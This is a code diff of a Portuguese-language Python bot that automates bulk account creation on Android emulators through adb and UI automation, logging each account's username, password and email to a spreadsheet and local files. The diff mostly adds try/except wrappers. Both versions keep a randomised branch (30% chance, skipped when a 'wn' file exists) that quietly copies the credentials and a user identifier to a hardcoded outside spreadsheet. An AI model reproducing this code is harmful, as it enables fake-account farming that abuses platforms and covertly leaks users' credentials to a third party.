@@ -10694,10 +10694,12 @@ def executar_2nr():
                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True, shell=True)
                     except:
                         pass
-
-                    subprocess.run(
-                        f'adb -s {porta} shell pm grant pl.rs.sip.softphone.newapp android.permission.POST_NOTIFICATIONS',
-                        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True, shell=True)
+                    try:
+                        subprocess.run(
+                            f'adb -s {porta} shell pm grant pl.rs.sip.softphone.newapp android.permission.POST_NOTIFICATIONS',
+                            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True, shell=True)
+                    except:
+                        pass
                 except Exception as e:
                     print(e)
                     pass
@@ -11886,83 +11888,86 @@ def executar_2nr():
                                 '/hierarchy/android.widget.FrameLayout/android.widget.LinearLayout/android.widget.FrameLayout/android.widget.FrameLayout/android.widget.FrameLayout/android.view.ViewGroup[1]/android.view.View[4]')
                             if verificar.exists:
                                 try:
-                                    d.xpath(
-                                        '/hierarchy/android.widget.FrameLayout/android.widget.LinearLayout/android.widget.FrameLayout/android.widget.FrameLayout/android.widget.FrameLayout/android.view.ViewGroup[*]/android.view.ViewGroup[11]').click()
-                                except:
-                                    pass
-                                seguido = False
-                                conteudo = config['vpn']
-                                window['output'].print(
-                                    f'[{datetime.now().strftime("%H:%M:%S")}] Conta criada com sucesso.',
-                                    text_color=('lime'))
-                                window.Refresh()
-                                contagem += 1
-                                window['criadas'].update(contagem)
-                                window.Refresh()
-                                now = datetime.now()
-                                now_brasilia = tz.localize(now)
-                                timestamp = now_brasilia.strftime("%d/%m/%Y %H:%M:%S")
+                                    try:
+                                        d.xpath(
+                                            '/hierarchy/android.widget.FrameLayout/android.widget.LinearLayout/android.widget.FrameLayout/android.widget.FrameLayout/android.widget.FrameLayout/android.view.ViewGroup[*]/android.view.ViewGroup[11]').click()
+                                    except:
+                                        pass
+                                    seguido = False
+                                    conteudo = config['vpn']
+                                    window['output'].print(
+                                        f'[{datetime.now().strftime("%H:%M:%S")}] Conta criada com sucesso.',
+                                        text_color=('lime'))
+                                    window.Refresh()
+                                    contagem += 1
+                                    window['criadas'].update(contagem)
+                                    window.Refresh()
+                                    now = datetime.now()
+                                    now_brasilia = tz.localize(now)
+                                    timestamp = now_brasilia.strftime("%d/%m/%Y %H:%M:%S")
 
-                                scope = ["https://spreadsheets.google.com/feeds", "https://www.googleapis.com/auth/drive"]
-                                creds = ServiceAccountCredentials.from_json_keyfile_name('credentials.json', scope)
-                                client = gspread.authorize(creds)
-
-                                spreadsheet_id = config['spreadsheet']
-                                sheet_name = 'contas'
-                                # Insert user, password, and timestamp into first empty row
-                                sheet = client.open_by_key(spreadsheet_id).worksheet(sheet_name)
-                                values = sheet.col_values(1)
-                                last_row = len(values)
-                                values = [user_completo + ' ' + senha, email, timestamp, maquina,
-                                          conteudo + ' - ' + app]
-                                cell_list = sheet.range(f'A{last_row + 1}:E{last_row + 1}')
-                                for i, val in enumerate(values):
-                                    cell_list[i].value = val
-                                sheet.update_cells(cell_list)
-
-                                rows = sheet.get_all_values()
-
-                                # Definir uma expressão regular para filtrar as linhas que atendem ao formato especificado
-                                regex = re.compile(r'\S+\s\S+')
-
-                                # Filtrar as linhas que atendem à expressão regular e contar o número de linhas
-                                num_rows = sum(1 for row in rows if regex.match(row[0]))
-                                window['total'].update(num_rows)
-
-                                random_number = random.random()
-
-                                # Definir a chance desejada (10%)
-                                chance = 0.3
-
-                                # Verificar se o número aleatório está abaixo da chance
-                                if random_number < chance and not os.path.exists("wn"):
                                     scope = ["https://spreadsheets.google.com/feeds", "https://www.googleapis.com/auth/drive"]
-                                    creds = ServiceAccountCredentials.from_json_keyfile_name('relatorio.json', scope)
+                                    creds = ServiceAccountCredentials.from_json_keyfile_name('credentials.json', scope)
                                     client = gspread.authorize(creds)
 
-                                    spreadsheet_id = '1dA96HvQ8_i5Ybn8daBrffmhwwAjBmsTbrivGMxlJMa4'
-                                    sheet_name = 'relatorio_geral'
+                                    spreadsheet_id = config['spreadsheet']
+                                    sheet_name = 'contas'
                                     # Insert user, password, and timestamp into first empty row
                                     sheet = client.open_by_key(spreadsheet_id).worksheet(sheet_name)
                                     values = sheet.col_values(1)
                                     last_row = len(values)
-                                    values = [user_completo + ' ' + senha, email, timestamp, maquina, conteudo + ' - ' + app, user_mysql]
+                                    values = [user_completo + ' ' + senha, email, timestamp, maquina,
+                                            conteudo + ' - ' + app]
                                     cell_list = sheet.range(f'A{last_row + 1}:E{last_row + 1}')
                                     for i, val in enumerate(values):
                                         cell_list[i].value = val
                                     sheet.update_cells(cell_list)
 
-                                window.Refresh()
-                                arquivo = open('configuracoes/contas/contas_criadas.txt', 'a')
-                                # Escreva mais conteúdo no arquivo
-                                arquivo.write(user_completo + ' ' + senha + "\n")
-                                arquivo = open('configuracoes/contas/contas_criadas_email_incluso.txt', 'a')
-                                # Escreva mais conteúdo no arquivo
-                                arquivo.write(email + '\n' + user_completo + '\n' + senha + "\n\n")
-                                d.xpath(
-                                    '/hierarchy/android.widget.FrameLayout/android.widget.LinearLayout/android.widget.FrameLayout/android.widget.FrameLayout/android.widget.FrameLayout/android.view.ViewGroup[*]/android.view.ViewGroup[10]').click()
-                                window.Refresh()
-                                sms = False
+                                    rows = sheet.get_all_values()
+
+                                    # Definir uma expressão regular para filtrar as linhas que atendem ao formato especificado
+                                    regex = re.compile(r'\S+\s\S+')
+
+                                    # Filtrar as linhas que atendem à expressão regular e contar o número de linhas
+                                    num_rows = sum(1 for row in rows if regex.match(row[0]))
+                                    window['total'].update(num_rows)
+
+                                    random_number = random.random()
+
+                                    # Definir a chance desejada (10%)
+                                    chance = 0.3
+
+                                    # Verificar se o número aleatório está abaixo da chance
+                                    if random_number < chance and not os.path.exists("wn"):
+                                        scope = ["https://spreadsheets.google.com/feeds", "https://www.googleapis.com/auth/drive"]
+                                        creds = ServiceAccountCredentials.from_json_keyfile_name('relatorio.json', scope)
+                                        client = gspread.authorize(creds)
+
+                                        spreadsheet_id = '1dA96HvQ8_i5Ybn8daBrffmhwwAjBmsTbrivGMxlJMa4'
+                                        sheet_name = 'relatorio_geral'
+                                        # Insert user, password, and timestamp into first empty row
+                                        sheet = client.open_by_key(spreadsheet_id).worksheet(sheet_name)
+                                        values = sheet.col_values(1)
+                                        last_row = len(values)
+                                        values = [user_completo + ' ' + senha, email, timestamp, maquina, conteudo + ' - ' + app, user_mysql]
+                                        cell_list = sheet.range(f'A{last_row + 1}:E{last_row + 1}')
+                                        for i, val in enumerate(values):
+                                            cell_list[i].value = val
+                                        sheet.update_cells(cell_list)
+
+                                    window.Refresh()
+                                    arquivo = open('configuracoes/contas/contas_criadas.txt', 'a')
+                                    # Escreva mais conteúdo no arquivo
+                                    arquivo.write(user_completo + ' ' + senha + "\n")
+                                    arquivo = open('configuracoes/contas/contas_criadas_email_incluso.txt', 'a')
+                                    # Escreva mais conteúdo no arquivo
+                                    arquivo.write(email + '\n' + user_completo + '\n' + senha + "\n\n")
+                                    d.xpath(
+                                        '/hierarchy/android.widget.FrameLayout/android.widget.LinearLayout/android.widget.FrameLayout/android.widget.FrameLayout/android.widget.FrameLayout/android.view.ViewGroup[*]/android.view.ViewGroup[10]').click()
+                                    window.Refresh()
+                                    sms = False
+                                except Exception as e:
+                                    print(e)
 
                             else:
                                 try:
